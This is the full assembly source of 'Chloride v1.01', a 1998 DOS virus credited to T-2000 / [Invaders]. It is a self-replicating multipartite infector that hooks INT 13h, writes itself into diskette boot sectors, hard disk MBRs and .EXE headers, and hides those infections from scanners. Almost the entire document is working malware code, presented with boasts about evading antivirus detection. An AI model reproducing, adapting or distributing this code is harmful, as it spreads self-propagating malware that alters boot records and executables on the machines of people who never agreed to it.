;============================================================================
;
;     NAME: Chloride v1.01
;     TYPE: Multipartite full-stealth bootsector/MBR & .EXE-header infector.
;     DATE: May - June 1998.
;   AUTHOR: T-2000 / [Invaders].
;    PHASE: Release version.
;   RATING: 90%
;     SIZE: 418 bytz.
;  TARGETS: Harddisks, 1.44M diskettes, & .EXE-headers.
;
;
;  Full-stealth bootsector/MBR & .EXE-header infector in 418 bytes.
;
;
; Chloride will go resident after boot-up from a infected disk, or execution
; of a infected file. It will then infect all non-writeprotected 1.44M
; diskettes, harddisks, and .EXE-headers which are read.
;
; Chloride was inspired by the BootEXE-virus, which infects bootsectors/MBRs
; and .EXE-headers. Only difference is that Chloride is full-stealth (it
; stealths infected bootsectors/MBRs, and EXE-headers from sectorlevel).
; Bcoz Chloride stealths from the lowest level, it cannot be detected by
; any program which doesn't use tunneling (includes TBSCAN).
;
; Gimme 32 bytes more, and I can make it compatible/fast as hell!
;
;
; TECHNICAL STUFF: Most linkers set an headersize of 512 bytes, this way
;                  there should be enough room for the relocationtable.
;                  The actual used (formatted) headersize is however, 32
;                  bytes, this leaves us (512 - 32) bytes for storage of
;                  our virus. To let the virus gain control we must set
;                  the headersize to 32 bytes (02h paragraphs), CS to zero,
;                  and IP to the virus-entrypoint.
;
;
;  HOW 2 CONTACT ME:
;                       E-Mail: T2000_@hotmail.com
;                          IRC: Undernet, #virus.
;
; Greetz go out 2 all Invaders!
; And also a big 'FUCK YOU!' to skool, work, and all other restrictions!
;
;
;                     "To be or not to be... not to be"
;                           - Last action hero -
;
;============================================================================


                .MODEL  TINY    ; Like all virii.
                .STACK  2048    ; Should be sufficient for us.
                .286            ; Allows us 2 use shorter instructions.
                .CODE


Marker_Boot     EQU     19CDh   ; INT 19h
Marker_File     EQU     3CEBh   ; JMP SHORT boot_entry


                ; == Bootsector entrypoint ==

                JMP     Boot_Entry
                NOP

                ; === Data-table of a 1.44M disk. ===

                DB      4Dh,  53h, 44h,  4Fh, 53h, 35h
                DB      2Eh,  30h, 00h,  02h, 01h, 01h
                DB      00h,  02h, 0E0h, 00h, 40h, 0Bh
                DB      0F0h, 09h, 00h,  12h, 0h,  02h
                DB      00h,  00h, 00h,  00h, 00h, 00h
                DB      00h,  00h, 00h,  00h, 00h, 29H
                DB      0ECH, 16H, 29H, 18H
                DB      '=CHLORIDE!='
                DB      'FAT12   '

Boot_Entry:
                MOV     SI, 7C00h
                XOR     DI, DI

                CLI
                MOV     SS, DI                  ; Setup stack.
                MOV     SP, SI
                STI

                MOV     DS, DI

                INT     12h                     ; Reserve one kilobyte.
                DEC     AX
                MOV     DS:[413h], AX

                SHL     AX, 6                   ; Convert to segment.

                MOV     ES, AX

                CLD                             ; Copy virus to virussegment.
                MOV     CX, (512 / 2)
                REP     MOVSW

                PUSH    ES                      ; Jump to relocated virus
                PUSH    OFFSET Relocated        ; in virussegment.
                RETF

Relocated:
                CALL    Hook_Int13h             ; hmmm... What would dis be?

Boot_Sig        DW      0
                ORG     $-2
                INT     19h


Stored_TS       DW      0
Stored_HD       DW      0

Check_EXE:
                PUSHA
                PUSHF
                PUSH    DS
                PUSH    ES
                PUSH    CX

                PUSH    ES
                POP     DS

                ; File already infected?

                CMP     DS:[BX.Place_Sign], Marker_File
                JNE     Infect_Header

                CLD                             ; Copy back original CS:IP.
                MOV     SI, BX                  ; - STEALTH -
                MOV     DI, BX
                ADD     SI, OFFSET Old_Entry + 32
                ADD     DI, 14h                 ; Init_IP
                MOVSW
                MOVSW

                MOV     AX, DS:[BX.Old_HeaderSize+32]   ; Copy back headersize.
                MOV     DS:[BX.HeaderSize], AX

                XOR     AX, AX                  ; Fill rest with zeroes.
                MOV     DI, BX                  ; - STEALTH -
                ADD     DI, 32
                MOV     CX, (512 - 32) / 2
                REP     STOSW

                JMP     Exit_EXE

Infect_Header:
                CLD                             ; Check if the unformatted
                XOR     AX, AX                  ; part of header is empty.
                MOV     DI, BX                  ; This assures us that the
                ADD     DI, 32                  ; stealthed file is identical
                MOV     CX, (512 - 32) / 2      ; to the original one.
                REPZ    SCASW
                JNZ     Exit_EXE

                CALL    Copy_Sector             ; Copy buffer caller 2 ours.

                MOV     BX, OFFSET Buffer

                MOV     SI, OFFSET Buffer.Init_IP  ; Save CS:IP.
                MOV     DI, OFFSET Old_Entry
                MOVSW
                MOVSW

                MOV     AX, Buffer.HeaderSize   ; Save old headersize.
                MOV     Old_HeaderSize, AX

                CLD                             ; Copy us into unformatted
                XOR     SI, SI                  ; part of header.
                MOV     DI, OFFSET Buffer + 32
                MOV     CL, ((512 - 32) / 2)
                REP     MOVSW

                ; Set file's new entrypoint (us).

                MOV     [BX.Init_IP], OFFSET Start
                AND     [BX.Init_CS], 0

                MOV     [BX.HeaderSize], 02h    ; Headersize = 32 bytes.

                MOV     AX, 0301h               ; Write infected sector.
                POP     CX
                PUSH    CX
                INT     13h

Exit_EXE:       POP     CX
                POP     ES
                POP     DS
                POPF
                POPA

                JMP     Exit

JMP_Check_EXE:  JMP     Check_EXE

NewInt13h:
                CMP     AH, 02h                 ; Doing a read?
                JNE     JMP_Exit_Int

                PUSHF                           ; Execute function.
                CALL    DWORD PTR CS:Int13h
                JC      Exit                    ; Exit if error occurred.

                CMP     ES:[BX], 'ZM'           ; .EXE?
                JE      JMP_Check_EXE

                OR      DH, DH                  ; Head 0?
                JNZ     Exit

                CMP     CX, 01h                 ; Track 0, sector 1?
                JNE     Exit

                CALL    Reading_Boot

Exit:           RETF    2                       ; Return to caller.

JMP_Exit_Int:   JMP     DWORD PTR CS:Int13h     ; JMP to next chain-handler.

Reading_Boot:
                PUSHF
                PUSHA
                PUSH    DS
                PUSH    ES

                PUSH    ES
                POP     DS

                CMP     DS:[BX.Boot_Sig], Marker_Boot
                JNE     Infect_Disk

                MOV     AX, 0201h               ; Read original bootsector.
                MOV     CX, DS:[BX.Stored_TS]
                MOV     DX, DS:[BX.Stored_HD]
                INT     13h

                JMP     Exit_Int13h
Infect_Disk:
                CMP     DL, 80h                 ; First harddrive?
                JNB     Do_Infect

                CMP     BYTE PTR ES:[BX+15h], 0F0h  ; HD-diskette?
                JNE     Exit_Int13h                 ; Bail-out when not.

                MOV     DH, 01h

Do_Infect:      MOV     AX, 0301h               ; Store old bootsector.
                PUSH    AX
                MOV     CL, 0Fh
                INT     13h

                MOV     CS:Stored_TS, CX
                MOV     CS:Stored_HD, DX

                CALL    Copy_Sector

                MOV     SI, 62                  ; Copy virus into bootsector.
                MOV     DI, OFFSET Buffer + 62
                MOV     DS:[DI-62], 3CEBh       ; JMP virus.
                MOV     CX, (512 - 64) / 2
                REP     MOVSW

                POP     AX                      ; Write infected bootsector.
                MOV     BX, OFFSET Buffer
                INC     CX                      ; CX=01h.
                XOR     DH, DH
                INT     13h

Exit_Int13h:    POP     ES
                POP     DS
                POPA
                POPF

                RETN



                ; === Entrypoint of infected .EXE-files. ===
START:
                PUSHA
                PUSH    DS
                PUSH    ES

                MOV     AX, DS                  ; Get our MCB.
                DEC     AX
                MOV     DS, AX

                XOR     SI, SI

                ; Subtract our needs.

                SUB     WORD PTR DS:[SI+03h], (1024 / 16)  ; From MCB.
                SUB     WORD PTR DS:[SI+12h], (1024 / 16)  ; From TOM.

                MOV     ES, DS:[SI+12h]         ; Our segment = old TOM.

                PUSH    CS
                POP     DS

                CLD                             ; Copy us to TOM.
                XOR     DI, DI
                MOV     CX, 512
                PUSH    CX
                REP     MOVSB

                PUSH    ES                      ; JMP to relocated virus.
                PUSH    OFFSET Reloc_File
                RETF


Reloc_File:
                CALL    Hook_Int13h             ; Duh?!

                MOV     AX, 0201h
                POP     BX                      ; BX = offset buffer.
                INC     CX                      ; CX=01h.
                MOV     DX, 80h
                INT     13h

                POP     ES
                POP     DS
                POPA

                MOV     AX, DS                  ; AX = PSP.
                ADD     AX, 10h + ((512 - 32) / 16)

                ADD     CS:Old_Entry+2, AX

                JMP     $+2                     ; Stoopid prefetcher!

                DB      0EAh                    ; JMP FAR...
Old_Entry       DW      OFFSET Carrier,  - ((512 - 32) / 16)
Old_HeaderSize  DW      0


        ; Saves the original INT 13h address and hooks it.

Hook_Int13h:
                XOR     AX, AX
                MOV     DS, AX

                CLD
                MOV     SI, 13h * 4
                MOV     DI, OFFSET Int13h

                CLI
                MOVSW
                MOVSW
                MOV     WORD PTR DS:[SI-4], OFFSET NewInt13h
                MOV     WORD PTR DS:[SI-2], CS
                STI

                RETN

; Copies the sector specified by ES:BX to our buffer.
Copy_Sector:
                PUSH    ES
                POP     DS

                PUSH    CS
                POP     ES

                CLD                             ; Copy bootsector to our buf.
                MOV     SI, BX
                MOV     DI, OFFSET Buffer
                MOV     CX, (512 / 2)
                REP     MOVSW

                PUSH    CS
                POP     DS

                RETN


Virus_Name      DB      'Cl'                    ; Dammit! makes me think
                                                ; about skool!!

Int13h          DW      0, 0

                ORG     510
                DW      0AA55h


Buffer:

Carrier:
                PUSH    CS
                POP     DS

                MOV     AH, 09h
                MOV     DX, OFFSET Warning_Msg
                INT     21h

                MOV     AX, 4C00h
                INT     21h

Warning_Msg     DB      '===> Dis file iz infected with Chloride v1.01 <==='
                DB      0Ah, 0Dh, 0Ah, 0Dh
                DB      'Full-stealth multipartite bootsector/MBR & .EXE-'
                DB      'header infector in 418 bytez.', 0Ah, 0Dh
                DB      'Coded in May - June 1998, by T-2000 / [Invaders].'
                DB      0Ah, 0Dh, '$'

; Structure of the .EXE-header.

EXE_Header      STRUC
Mark            DW      0       ; .EXE-identifier (always 'MZ').
Mod512          DW      0       ; Filesize MOD 512.
Byte_Pages      DW      0       ; Filesize in 512-byte pages (rounded-up).
Num_Reloc       DW      0       ; 
HeaderSize      DW      0       ; Headersize in paragraphs.
MinMem          DW      0       ; Minimal memory requirements in paragraphs.
MaxMem          DW      0       ; Maximal memory requirements in paragraphs.
Init_SS         DW      0       ; Program's SS.
Init_SP         DW      0       ; Initial SP.
Checksum        DW      0       ; Checksum, unused by MS-DOS, used by us.
Init_IP         DW      0       ; Initial IP.
Init_CS         DW      0       ; CS.
                DW      0
                DW      0
                DW      0
                DW      0
Place_Sign      DW      0       ; JMP SHORT Boot_Entry, if infected.

EXE_Header      ENDS

                END     START
